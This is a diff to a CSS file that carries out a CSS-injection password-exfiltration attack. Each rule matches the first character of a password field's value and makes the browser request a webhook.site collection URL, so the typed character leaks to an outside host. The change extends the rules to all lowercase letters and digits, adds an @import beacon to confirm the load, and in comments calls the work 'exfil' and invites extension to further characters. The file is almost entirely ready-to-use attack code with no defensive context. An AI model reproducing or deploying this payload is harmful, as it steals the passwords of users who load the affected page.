@@ -1,19 +1,44 @@
-/* Start the exfil — to confirm load */
-body { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/start"); }
+/* Confirm that CSS loaded */
+@import url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/start");
 
-/* Brute-force first character of password */
-input[type="password"][value^="a"] {
-    background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/a");
-}
-input[type="password"][value^="b"] {
-    background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/b");
-}
-input[type="password"][value^="c"] {
-    background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/c");
-}
-/* …repeat for all possible characters… */
+/* Brute-force printable characters (lowercase letters + digits);
+   extend as needed: uppercase, symbols, underscores, braces, etc. */
+input[name="password"][value^="a"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/a"); }
+input[name="password"][value^="b"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/b"); }
+input[name="password"][value^="c"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/c"); }
+input[name="password"][value^="d"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/d"); }
+input[name="password"][value^="e"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/e"); }
+input[name="password"][value^="f"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/f"); }
+input[name="password"][value^="g"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/g"); }
+input[name="password"][value^="h"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/h"); }
+input[name="password"][value^="i"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/i"); }
+input[name="password"][value^="j"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/j"); }
+input[name="password"][value^="k"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/k"); }
+input[name="password"][value^="l"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/l"); }
+input[name="password"][value^="m"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/m"); }
+input[name="password"][value^="n"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/n"); }
+input[name="password"][value^="o"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/o"); }
+input[name="password"][value^="p"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/p"); }
+input[name="password"][value^="q"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/q"); }
+input[name="password"][value^="r"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/r"); }
+input[name="password"][value^="s"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/s"); }
+input[name="password"][value^="t"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/t"); }
+input[name="password"][value^="u"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/u"); }
+input[name="password"][value^="v"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/v"); }
+input[name="password"][value^="w"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/w"); }
+input[name="password"][value^="x"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/x"); }
+input[name="password"][value^="y"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/y"); }
+input[name="password"][value^="z"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/z"); }
 
-/* You can then extend to guess the 2nd char: */
-input[type="password"][value^="aa"] {
-    background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/aa");
-}
+input[name="password"][value^="0"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/0"); }
+input[name="password"][value^="1"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/1"); }
+input[name="password"][value^="2"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/2"); }
+input[name="password"][value^="3"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/3"); }
+input[name="password"][value^="4"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/4"); }
+input[name="password"][value^="5"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/5"); }
+input[name="password"][value^="6"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/6"); }
+input[name="password"][value^="7"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/7"); }
+input[name="password"][value^="8"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/8"); }
+input[name="password"][value^="9"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/9"); }
+
+/* Extend with symbols or uppercase as needed */
